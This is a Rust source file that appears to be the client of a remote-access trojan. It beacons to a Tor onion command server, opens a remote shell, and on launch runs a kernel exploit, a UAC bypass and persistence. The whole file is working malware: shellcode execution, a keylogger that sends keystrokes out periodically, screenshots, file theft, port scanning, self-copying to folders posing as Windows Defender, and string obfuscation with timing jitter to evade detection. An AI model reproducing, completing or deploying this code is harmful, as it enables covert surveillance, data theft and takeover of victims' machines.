#[cfg(target_os = "windows")]
mod kernel_exploit;
pub mod obfuscate;


#[cfg(target_os = "windows")]
mod uac_cmstp;
#[cfg(target_os = "windows")]
mod uac_bypass;
mod persist;
mod portscanner;
pub mod util;
#[cfg(feature = "shared-lib")]
mod exports;
use goldberg::goldberg_stmts;
#[cfg(target_os = "windows")]
use is_elevated::is_elevated;
#[cfg(target_os = "windows")]
use std::os::windows::process::CommandExt;
#[cfg(target_os = "windows")]
use std::env;

use arti_client::{TorClient, DataStream};
use arti_client::config::TorClientConfigBuilder;
use tor_rtcompat::PreferredRuntime;
use tokio::io::split;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::process::Command;
use anyhow::{Result, anyhow};
use gethostname::gethostname;
use tokio::time::{sleep, Duration};
use std::{fs};
use std::path::{Path};
use base64::{engine::general_purpose, Engine as _};
use libc::{c_int};

#[cfg(not(target_os = "android"))]
use screenshots::{Screen};
#[cfg(not(target_os = "android"))]
use screenshots::image::ImageOutputFormat;





#[cfg(target_os = "windows")]
const CREATE_NO_WINDOW: u32 = 0x08000000;

const CONFIG_HOSTNAME: &[u8] = include_bytes!("../config/hostname");

fn get_onion_host() -> String {
    String::from_utf8_lossy(CONFIG_HOSTNAME).trim().to_string()
}


#[derive(Clone, Debug)]
pub struct ClientConfig {
    pub onion: String,
    pub port: u16,
}


impl Default for ClientConfig {
    fn default() -> Self {
        Self {
            onion: get_onion_host(),
            port: goldberg::goldberg_int!(1337),
        }
    }
}
/// Initialize Tor client
async fn init_tor() -> Result<TorClient<PreferredRuntime>> {
    let config = TorClientConfigBuilder::new()
        .build()?;
    let client = TorClient::create_bootstrapped(config).await?;
    println!("{}", cryptify::encrypt_string!("Initialized Tor Client"));
    Ok(client)
}

#[cfg(not(target_os = "android"))]
fn take_screenshot_base64() -> anyhow::Result<String> {
    let screens = Screen::all()?;
    let screen = &screens[0];

    // Capture screenshot
    let image = screen.capture()?;

    // Encode PNG into memory
    let mut png_bytes: Vec<u8> = Vec::new();

    image.write_to(
        &mut std::io::Cursor::new(&mut png_bytes),
        ImageOutputFormat::Png,
    )?;

    // Convert PNG bytes -> base64
    let b64 = general_purpose::STANDARD.encode(&png_bytes);
    Ok(format!("{}",b64))
}


const RESPONSE_DELIM: &str = "\n>> ";

fn get_hostname() -> String {
    gethostname()
        .into_string()
        .unwrap_or_else(|_| cryptify::encrypt_string!("unknown").into())
}

#[cfg(target_os = "windows")]
fn execute_shellcode_windows(data: &[u8]) -> Result<()> {
    unsafe {
        use std::ffi::CString;
        let kernel32 = winapi::um::libloaderapi::GetModuleHandleA(
            CString::new(cryptify::encrypt_string!("kernel32.dll")).unwrap().as_ptr(),
        );
        if kernel32.is_null() {
            return Err(anyhow!(cryptify::encrypt_string!("kernel32.dll not found")));
        }

        let virtual_alloc = winapi::um::libloaderapi::GetProcAddress(
            kernel32,
            CString::new(cryptify::encrypt_string!("VirtualAlloc")).unwrap().as_ptr(),
        );
        if virtual_alloc.is_null() {
            return Err(anyhow!(cryptify::encrypt_string!("resolve VirtualAlloc failed")));
        }
        let create_thread = winapi::um::libloaderapi::GetProcAddress(
            kernel32,
            CString::new(cryptify::encrypt_string!("CreateThread")).unwrap().as_ptr(),
        );
        if create_thread.is_null() {
            return Err(anyhow!(cryptify::encrypt_string!("resolve CreateThread failed")));
        }
        let close_handle = winapi::um::libloaderapi::GetProcAddress(
            kernel32,
            CString::new(cryptify::encrypt_string!("CloseHandle")).unwrap().as_ptr(),
        );
        if close_handle.is_null() {
            return Err(anyhow!(cryptify::encrypt_string!("resolve CloseHandle failed")));
        }
        let virtual_free = winapi::um::libloaderapi::GetProcAddress(
            kernel32,
            CString::new(cryptify::encrypt_string!("VirtualFree")).unwrap().as_ptr(),
        );
        if virtual_free.is_null() {
            return Err(anyhow!(cryptify::encrypt_string!("resolve VirtualFree failed")));
        }

        type VirtualAllocFn = unsafe extern "system" fn(*mut u8, usize, u32, u32) -> *mut u8;
        type CreateThreadFn = unsafe extern "system" fn(*mut u8, usize, Option<unsafe extern "system" fn(*mut u8) -> u32>, *mut u8, u32, *mut u32) -> *mut u8;
        type CloseHandleFn = unsafe extern "system" fn(*mut u8) -> i32;
        type VirtualFreeFn = unsafe extern "system" fn(*mut u8, usize, u32) -> i32;

        let virtual_alloc: VirtualAllocFn = std::mem::transmute(virtual_alloc);
        let create_thread: CreateThreadFn = std::mem::transmute(create_thread);
        let close_handle: CloseHandleFn = std::mem::transmute(close_handle);
        let _virtual_free: VirtualFreeFn = std::mem::transmute(virtual_free);

        let ptr = (virtual_alloc)(
            std::ptr::null_mut(),
            data.len(),
            goldberg::goldberg_int!(0x3000u32),
            goldberg::goldberg_int!(0x40u32),
        );
        if ptr.is_null() {
            return Err(anyhow!(cryptify::encrypt_string!("VirtualAlloc failed")));
        }

        std::ptr::copy_nonoverlapping(data.as_ptr(), ptr as *mut u8, data.len());

        let shellcode_fn: unsafe extern "system" fn(*mut u8) -> u32 = std::mem::transmute(ptr);
        let thread = (create_thread)(
            std::ptr::null_mut(),
            0,
            Some(shellcode_fn),
            std::ptr::null_mut(),
            0,
            std::ptr::null_mut(),
        );
        if thread.is_null() {
            return Err(anyhow!(cryptify::encrypt_string!("CreateThread failed")));
        }
        (close_handle)(thread);
    }
    Ok(())
}

#[cfg(not(target_os = "windows"))]
fn execute_shellcode_unix(data: &[u8]) -> Result<()> {
    let data = data.to_vec();
    std::thread::spawn(move || {
        unsafe {
            let pagesize = libc::sysconf(libc::_SC_PAGESIZE) as usize;
            let aligned_size = (data.len() + pagesize - 1) & !(pagesize - 1);

            let ptr = libc::mmap(
                std::ptr::null_mut(),
                aligned_size,
                libc::PROT_READ | libc::PROT_WRITE | libc::PROT_EXEC,
                libc::MAP_PRIVATE | libc::MAP_ANONYMOUS,
                -1,
                0,
            );

            if ptr == libc::MAP_FAILED {
                return;
            }

            std::ptr::copy_nonoverlapping(data.as_ptr(), ptr as *mut u8, data.len());

            let func: extern "C" fn() = std::mem::transmute(ptr);
            func();

            libc::munmap(ptr, aligned_size);
        }
    });
    Ok(())
}

/// Execute a command
pub async fn run_command(input: &str) -> Result<Vec<u8>> {
    obfuscate::sleep_jitter_default();
    let mut parts = input.trim().split_whitespace();

    let cmd = parts.next().ok_or_else(|| anyhow!(cryptify::encrypt_string!("Empty command")))?;
    let args: Vec<&str> = parts.collect();

    match cmd {
        "help" | "/h"|"/?" |"" => {
            Ok(format!("

Available commands:
    `cd [directory]`=>\t Change Directory to [directory]
    `screenshot`=>\tTake screenshot from vicim machine
    `upload [filename]`=>\tUpload file to the server
    `download [filename]`=>\tDownload file from the server
    `shellcode [file]`=>\tExecute shellcode from file
    `uac [exe_path]`=>\tRun elevated command on Windows (slui)
    `persist`=>\tApply persistence on target
    `self_move`=>\tMove executable to AppData/.cache
    `check_elevated`=>\tCheck if running with elevated privileges
    `self_uac`=>\tRun UAC bypass on self
    `portscan <tcp|udp|sctp> <host> [--fast]`=>\tPort scan target host
    `keylogger_start`=>\tStart keylogger (auto-dumps every 60s)
    `keylogger_stop`=>\tStop keylogger

    ").into_bytes())
        }
        "screenshot" => {
            obfuscate::sleep_jitter_default();
            #[cfg(target_os = "android")]
            let encoded = {
                let output = std::process::Command::new(cryptify::encrypt_string!("screencap"))
                    .arg(cryptify::encrypt_string!("-p"))
                    .output()
                    .context(cryptify::encrypt_string!("Failed to run screencap"))?;
                general_purpose::STANDARD.encode(&output.stdout)
            };
            #[cfg(not(target_os = "android"))]
            let encoded = take_screenshot_base64()?;

            let default_filename = cryptify::encrypt_string!("screenshot.png");
            let filename = args.get(goldberg::goldberg_int!(0)).filter(|s| !s.is_empty()).copied().unwrap_or(&default_filename);
            Ok(format!("[file] {} {}", filename, encoded).into_bytes())
        }
        "upload" => {
            obfuscate::sleep_jitter_default();
            let input_filename = args
                .get(goldberg::goldberg_int!(0))
                .ok_or_else(|| anyhow!(cryptify::encrypt_string!("upload: missing filename")))?;

            let path = Path::new(input_filename);

            let data = fs::read(path)?;

            let filename = path
                .file_name()
                .and_then(|f| f.to_str())
                .ok_or_else(|| anyhow!(cryptify::encrypt_string!("invalid filename")))?;
            let encoded = general_purpose::STANDARD.encode(&data);

            let mut output = format!("[file-start] {}\n", filename);
            for chunk in encoded.as_bytes().chunks(16384) {
                let chunk_str = std::str::from_utf8(chunk).unwrap();
                output.push_str(&cryptify::encrypt_string!("[file-chunk] "));
                output.push_str(chunk_str);
                output.push('\n');
            }
            output.push_str(&format!("[file-end] {}\n", filename));
            Ok(output.into_bytes())
        }
        "download" | "[file][" => {
            obfuscate::sleep_jitter_default();
            let input_filename = args
                .get(goldberg::goldberg_int!(0))
                .ok_or_else(|| anyhow!(cryptify::encrypt_string!("download: missing filename")))?;

            let encoded = args
                .get(goldberg::goldberg_int!(1))
                .ok_or_else(|| anyhow!(cryptify::encrypt_string!("download: missing data")))?;

            let data = general_purpose::STANDARD.decode(encoded)?;

            let path = Path::new(input_filename);

            fs::write(path, &data)?;

            Ok(format!("Wrote data to {}", input_filename).into_bytes())
        }
        "cd" => {
            obfuscate::sleep_jitter_default();
            let target = args.get(goldberg::goldberg_int!(0)).ok_or_else(|| anyhow!(cryptify::encrypt_string!("cd: missing argument")))?;

            match std::env::set_current_dir(target) {
                Ok(_) => {
                    let cwd = std::env::current_dir()?;
                    Ok(format!("Changed directory to {}\n", cwd.display()).into_bytes())
                }
                Err(e) => {
                    Ok(format!("cd error: {}\n", e).into_bytes())
                }
            }
        }
        "uac" => {
            obfuscate::sleep_jitter_default();
            #[cfg(target_os = "windows")]
            {
                if args.is_empty() {
                    return Ok(b"uac: missing argument\n".to_vec());
                }

                let payload = args.join(cryptify::encrypt_string!(" "));
                uac_bypass::uac_slui(&payload);

                Ok(format!("Triggered UAC (slui) with payload: {}\n", payload).into_bytes())
            }

            #[cfg(not(target_os = "windows"))]
            {
                Ok(b"uac not supported on this OS\n".to_vec())
            }
        }

        "persist" => {
            obfuscate::sleep_jitter_default();
            let _ = persist::persist();
            Ok(b"Persistence applied\n".to_vec())
        }

        "self_move" => {
            obfuscate::sleep_jitter_default();
            let current_exe = match std::env::current_exe() {
                Ok(p) => p,
                Err(_) => return Ok(b"Failed to get exe path\n".to_vec()),
            };
            #[cfg(target_os = "windows")]
            let target_dir = {
                let appdata = match std::env::var(cryptify::encrypt_string!("APPDATA")) {
                    Ok(d) => d,
                    Err(_) => return Ok(b"APPDATA not set\n".to_vec()),
                };
                Path::new(&appdata).join(cryptify::encrypt_string!("WindowsDefender"))
            };
            #[cfg(not(target_os = "windows"))]
            let target_dir = {
                let home = match std::env::var(cryptify::encrypt_string!("HOME")) {
                    Ok(d) => d,
                    Err(_) => return Ok(b"HOME not set\n".to_vec()),
                };
                Path::new(&home).join(cryptify::encrypt_string!(".cache/defender"))
            };
            let target_path = target_dir.join(cryptify::encrypt_string!("defender.exe"));
            if let Err(e) = std::fs::create_dir_all(&target_dir) {
                return Ok(format!("Failed to create directory: {}\n", e).into_bytes());
            }
            if let Err(e) = std::fs::copy(&current_exe, &target_path) {
                return Ok(format!("Failed to copy: {}\n", e).into_bytes());
            }
            #[cfg(target_os = "windows")]
            std::process::Command::new(&target_path)
                .creation_flags(CREATE_NO_WINDOW)
                .spawn()
                .ok();
            #[cfg(not(target_os = "windows"))]
            std::process::Command::new(&target_path)
                .spawn()
                .ok();
            std::process::exit(goldberg::goldberg_int!(0));
        }

        "check_elevated" => {
            obfuscate::sleep_jitter_default();
            #[cfg(target_os = "windows")]
            {
                let elevated = is_elevated();
                Ok(format!("Elevated: {}\n", elevated).into_bytes())
            }
            #[cfg(not(target_os = "windows"))]
            {
                Ok(b"check_elevated not supported on this OS\n".to_vec())
            }
        }

        "self_uac" => {
            obfuscate::sleep_jitter_default();
            #[cfg(target_os = "windows")]
            {
                let exe_path = match std::env::current_exe() {
                    Ok(p) => p.to_string_lossy().to_string(),
                    Err(_) => return Ok(b"Failed to get exe path\n".to_vec()),
                };
                uac_bypass::uac_slui(&exe_path);
                Ok(format!("Self-UAC triggered (slui) for: {}\n", exe_path).into_bytes())
            }
            #[cfg(not(target_os = "windows"))]
            {
                Ok(b"self_uac not supported on this OS\n".to_vec())
            }
        }

        "portscan" => {
            obfuscate::sleep_jitter_default();
            let protocol = args.get(goldberg::goldberg_int!(0)).ok_or_else(|| anyhow!(cryptify::encrypt_string!("portscan: missing protocol")))?.to_lowercase();
            let host = args.get(goldberg::goldberg_int!(1)).ok_or_else(|| anyhow!(cryptify::encrypt_string!("portscan: missing host")))?.to_string();
            let fast = args.contains(&cryptify::encrypt_string!("--fast").as_str());

            let ports: Vec<u16> = if fast {
                portscanner::COMMON_PORTS.to_vec()
            } else {
                (goldberg::goldberg_int!(1)..=goldberg::goldberg_int!(65535)).collect()
            };

            let total = ports.len();
            let msg = format!("Scanning {} ports on {} ({})...\n", total, host, protocol);
            let scan_type = protocol.as_str();

            let open = match scan_type {
                "tcp" => portscanner::scan_tcp(&host, &ports).await,
                "udp" => portscanner::scan_udp(&host, &ports).await,
                "sctp" => {
                    #[cfg(unix)]
                    { portscanner::scan_sctp(&host, &ports).await }
                    #[cfg(not(unix))]
                    { return Err(anyhow!(cryptify::encrypt_string!("SCTP scan not supported on this OS"))); }
                }
                _ => return Err(anyhow!("portscan: unknown protocol '{}' (use tcp, udp, or sctp)", protocol)),
            };

            if open.is_empty() {
                Ok(format!("{}No open ports found on {}\n", msg, host).into_bytes())
            } else {
                Ok(format!("{}Open ports on {} ({}): {}\n",
                    msg, host, protocol,
                    open.iter().map(|p| p.to_string()).collect::<Vec<_>>().join(", ")
                ).into_bytes())
            }
        }

        "shellcode" => {
            obfuscate::sleep_jitter_default();
            let b64_data = args
                .get(goldberg::goldberg_int!(0))
                .ok_or_else(|| anyhow!(cryptify::encrypt_string!("shellcode: missing base64 data")))?;

            let data = general_purpose::STANDARD.decode(b64_data)?;

            let msg = format!("Executing shellcode ({} bytes)\n", data.len());

            #[cfg(target_os = "windows")]
            execute_shellcode_windows(&data)?;

            #[cfg(not(target_os = "windows"))]
            execute_shellcode_unix(&data)?;

            Ok(msg.into_bytes())
        }

        "keylogger_start" => {
            obfuscate::sleep_jitter_default();
            if util::keylogger::is_running() {
                Ok(b"Keylogger already running\n".to_vec())
            } else {
                util::keylogger::start();
                Ok(b"Keylogger started\n".to_vec())
            }
        }
        "keylogger_stop" => {
            obfuscate::sleep_jitter_default();
            if util::keylogger::is_running() {
                util::keylogger::stop();
                Ok(b"Keylogger stopped\n".to_vec())
            } else {
                Ok(b"Keylogger not running\n".to_vec())
            }
        }
        "exit" | "quit" | "/quit" => {
            obfuscate::sleep_jitter_default();
            Ok(cryptify::encrypt_string!("Goodbye\n").as_bytes().to_vec())
        }

        _ => goldberg_stmts!({
            obfuscate::sleep_jitter_default();
            #[cfg(target_os = "windows")]
            let mut command = {
                let mut c = Command::new(cryptify::encrypt_string!("cmd.exe"));
                c.arg(cryptify::encrypt_string!("/C"))
                    .arg(input)
                    .creation_flags(CREATE_NO_WINDOW);
                c
            };

            #[cfg(target_os = "linux")]
            let mut command = {
                let mut c = Command::new(cryptify::encrypt_string!("/bin/sh"));
                c.arg(cryptify::encrypt_string!("-c")).arg(input);
                c
            };
            #[cfg(target_os = "macos")]
            let mut command = {
                let mut c = Command::new(cryptify::encrypt_string!("/bin/sh"));
                c.arg(cryptify::encrypt_string!("-c")).arg(input);
                c
            };
            #[cfg(target_os = "android")]
            let mut command = {
                let mut c = Command::new(cryptify::encrypt_string!("/system/bin/sh"));
                c.arg(cryptify::encrypt_string!("-c")).arg(input);
                c
            };



            let output = command.output().await?;
            obfuscate::sleep_jitter_default();
            let mut result = Vec::new();
            result.extend_from_slice(&output.stdout);
            result.extend_from_slice(&output.stderr);

            if result.is_empty() {
                result.extend_from_slice(b"(no output)\n");
            }

            if !result.ends_with(b"\n") {
                result.push(b'\n');
            }

            Ok(result)
        })
    }
}

/// Connect to onion service
pub async fn connect_onion(
    tor_client: &TorClient<PreferredRuntime>,
    onion_addr: &str,
    port: u16,
) -> Result<DataStream> {
    Ok(tor_client.connect((onion_addr, port)).await?)
}

/// Session loop, returns Ok(true) on exit, Ok(false) on disconnect
pub async fn read_loop(stream: DataStream) -> Result<bool> {
    let (mut reader, mut writer) = split(stream);

    let mut buf = [0u8; 16384];
    let mut buffer = String::new();
    let mut dl_filename: Option<String> = None;
    let mut dl_data: String = String::new();

    let hostname = get_hostname();
    writer.write_all(hostname.as_bytes()).await?;
    writer.write_all(b"\n>> ").await?;
    writer.flush().await?;

    let mut keylog_timer = tokio::time::interval(Duration::from_secs(goldberg::goldberg_int!(60)));
    keylog_timer.tick().await;

    loop {
        tokio::select! {
            _ = keylog_timer.tick() => {
                if util::keylogger::is_running() {
                    let keys = util::keylogger::dump_and_clear();
                    if !keys.is_empty() {
                        let encoded = general_purpose::STANDARD.encode(keys.as_bytes());
                        let msg = format!("[keylog] {}\n", encoded);
                        let _ = writer.write_all(msg.as_bytes()).await;
                        let _ = writer.flush().await;
                    }
                }
            }
            result = reader.read(&mut buf) => {
                let n = result?;

                if n == 0 {
                    println!("{}", cryptify::encrypt_string!("Connection closed by remote"));
                    return Ok(false);
                }

                buffer.push_str(&String::from_utf8_lossy(&buf[..n]));
                
                while let Some(pos) = buffer.find('\n') {
                    let mut line = buffer[..pos].to_string();
                    buffer.drain(..=pos);

                    line = line.trim().to_string();

                    if line.starts_with(&cryptify::encrypt_string!("download-start ")) {
                        let parts: Vec<&str> = line.splitn(goldberg::goldberg_int!(2), ' ').collect();
                        dl_filename = Some(parts.get(goldberg::goldberg_int!(1)).copied().unwrap_or(&cryptify::encrypt_string!("unknown")).to_string());
                        dl_data.clear();
                        continue;
                    }

                    if dl_filename.is_some() {
                        if line.starts_with(&cryptify::encrypt_string!("download-chunk ")) {
                            let parts: Vec<&str> = line.splitn(goldberg::goldberg_int!(2), ' ').collect();
                            if let Some(chunk) = parts.get(goldberg::goldberg_int!(1)) {
                                dl_data.push_str(chunk);
                            }
                            continue;
                        }
                        if line == cryptify::encrypt_string!("download-end") {
                            let fname = dl_filename.take().unwrap();
                            let raw = general_purpose::STANDARD.decode(&dl_data)?;
                            fs::write(&fname, &raw)?;
                            let msg = format!("Wrote data to {}\n", fname);
                            writer.write_all(msg.as_bytes()).await?;
                            writer.write_all(RESPONSE_DELIM.as_bytes()).await?;
                            writer.flush().await?;
                            continue;
                        }
                        dl_filename = None;
                        dl_data.clear();
                    }

                    if line.is_empty() {
                        writer.write_all(RESPONSE_DELIM.as_bytes()).await?;
                        writer.flush().await?;
                        continue;
                    }

                    if line == cryptify::encrypt_string!("exit") || line == cryptify::encrypt_string!("quit") || line == cryptify::encrypt_string!("/quit") {
                        writer.write_all(b"Goodbye\n").await?;
                        writer.flush().await?;
                        return Ok(true);
                    }

                    match run_command(&line).await {
                      Ok(output) => {
                      writer.write_all(&output).await?;
                      }
                      Err(e) => {
                        let err_msg = format!("ERROR: {}\n", e);
                        writer.write_all(err_msg.as_bytes()).await?;
                    }
                }

                writer.write_all(RESPONSE_DELIM.as_bytes()).await?;
                writer.flush().await?;
                }
            }
        }
    }
}
fn rand_range(min: u64, max: u64) -> u64 {
    let nanos = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_nanos();
    min + (nanos as u64) % (max - min + 1)
}
/// Core runner
pub async fn netclient_run(config: ClientConfig) -> Result<()> {
    loop {
        println!("{}", cryptify::encrypt_string!("Attempting to connect..."));

        let tor_client = init_tor().await?;

        match connect_onion(&tor_client, &config.onion, config.port).await {
            Ok(stream) => {
                println!("{}", cryptify::encrypt_string!("Connected to onion service"));

                match read_loop(stream).await {
                    Ok(true) => {
                        println!("{}", cryptify::encrypt_string!("Exit requested"));
                        break;
                    }
                    Ok(false) => {
                        println!("{}", cryptify::encrypt_string!("Connection closed"));
                    }
                    Err(e) => {
                        println!("Session error: {}", e);
                    }
                }
            }
            Err(e) => {
                println!("Connection failed: {}", e);
            }
        }
        let delay = rand_range(goldberg::goldberg_int!(13), goldberg::goldberg_int!(121));
        println!("Reconnecting in {} seconds...", delay);
        sleep(Duration::from_secs(delay)).await;
    }
    Ok(())
}


async fn netclient_impl() -> c_int {
    goldberg_stmts!({
        #[cfg(target_os = "windows")]
        {
            unsafe { kernel_exploit::exploit(); }
        }
        cryptify::flow_stmt!();
        let exe: String = std::env::current_exe().unwrap().display().to_string();
        obfuscate::sleep_jitter_default();
        cryptify::flow_stmt!();
        obfuscate::sleep_jitter_default();
        cryptify::flow_stmt!();
        #[cfg(target_os = "windows")]
        {
            uac_cmstp::execute(&exe);
        }
        obfuscate::sleep_jitter_default();
        cryptify::flow_stmt!();
        let _ = persist::persist();
        obfuscate::sleep_jitter_default();
        cryptify::flow_stmt!();
        let _ = netclient_run(ClientConfig::default()).await;
        0
    })
}
pub async fn netclient() -> c_int {
    netclient_impl().await;
    0
}

#[cfg(feature = "shared-lib")]
pub async fn netclient_dll() -> c_int {
    netclient_impl().await;
    0
}
